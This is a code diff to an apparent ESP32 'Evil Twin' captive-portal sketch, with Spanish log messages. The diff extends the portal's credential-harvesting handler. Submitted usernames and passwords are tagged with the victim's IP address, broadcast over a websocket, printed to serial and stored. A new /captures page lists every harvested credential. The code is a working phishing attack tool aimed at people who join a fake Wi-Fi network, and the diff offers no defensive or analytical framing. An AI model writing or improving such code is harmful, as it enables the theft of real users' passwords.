@@ -20,6 +20,8 @@ DNSServer dnsServer;
 AsyncWebServer server(80);
 AsyncWebSocket ws("/ws");
 
+std::vector<String> captureLog;
+
 void setup() {
   Serial.begin(115200);
   Serial.println("\nConfigurando Evil Twin y Portal Cautivo...");
@@ -44,21 +46,25 @@ void setup() {
   });
 
   server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("user", true) && request->hasParam("pass", true)) {
-      String user = request->getParam("user", true)->value();
-      String pass = request->getParam("pass", true)->value();
+    String user = request->getParam("user", true)->value();
+    String pass = request->getParam("pass", true)->value();
 
-      Serial.print("Credenciales Capturadas: User=");
-      Serial.print(user);
-      Serial.print(", Pass=");
-      Serial.println(pass);
+    String capture = "{\"user\":\"" + user + "\",\"pass\":\"" + pass + "\"}";
+    ws.textAll(capture);
+    capture = request->client()->remoteIP().toString() + " > " + capture;
+    Serial.println(capture);
+    captureLog.push_back(capture);
 
-      ws.textAll("{\"user\":\"" + user + "\",\"pass\":\"" + pass + "\"}");
+    request->send(200, "text/plain", "Credenciales recibidas!");
+  });
 
-      request->send(200, "text/plain", "Credenciales recibidas!");
-    } else {
-      request->send(400, "text/plain", "Faltan datos de usuario o contraseña");
+  server.on("/captures", HTTP_GET, [](AsyncWebServerRequest *request) {
+    String response = "<pre>";
+    for (const auto &capture : captureLog) {
+      response += capture + "\n";
     }
+    response += "</pre>";
+    request->send(200, "text/html", response);
   });
 
   server.on("/log", HTTP_GET, [](AsyncWebServerRequest *request) {
